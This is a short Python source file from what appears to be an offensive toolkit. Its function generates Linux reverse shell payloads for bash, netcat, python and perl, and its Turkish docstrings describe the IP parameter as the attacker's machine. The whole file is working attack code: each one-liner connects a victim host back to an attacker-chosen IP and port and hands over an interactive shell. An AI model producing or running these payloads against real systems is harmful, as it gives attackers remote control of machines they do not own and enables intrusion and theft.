# payloads/linux_reverse_shell.py

def generate_reverse_shell(ip: str, port: int, shell_type: str = "bash") -> str:
    """
    Linux için çeşitli reverse shell payload'ları üretir.
    
    :param ip: Saldırgan makinenin IP adresi
    :param port: Bağlantının geleceği port
    :param shell_type: bash, python, nc, perl gibi shell tipi
    :return: String olarak payload
    """

    shells = {
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "nc": f"nc -e /bin/bash {ip} {port}",
        "python": (
            f"python3 -c 'import socket,os,pty;"
            f"s=socket.socket();s.connect((\"{ip}\",{port}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        ),
        "perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};" 
                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
                f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    }

    return shells.get(shell_type.lower(), f"# Unsupported shell type: {shell_type}")
